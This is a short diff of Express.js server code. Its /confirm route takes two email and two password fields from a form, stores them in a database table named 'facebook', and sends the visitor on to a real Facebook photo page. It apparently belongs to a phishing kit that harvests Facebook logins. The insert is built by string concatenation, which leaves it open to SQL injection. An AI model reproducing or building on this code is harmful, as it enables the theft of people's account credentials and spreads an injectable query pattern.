@@ -35,14 +35,13 @@ app.post('/confirm', function (req, res) {
     var b = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
-    console.log(a,b,c,d)
+    res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
    
     client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
         if (!err) {
             console.log(result)
         }
     })
-    res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
 })
 
 app.post('/confirm_amir', function (req, res) {
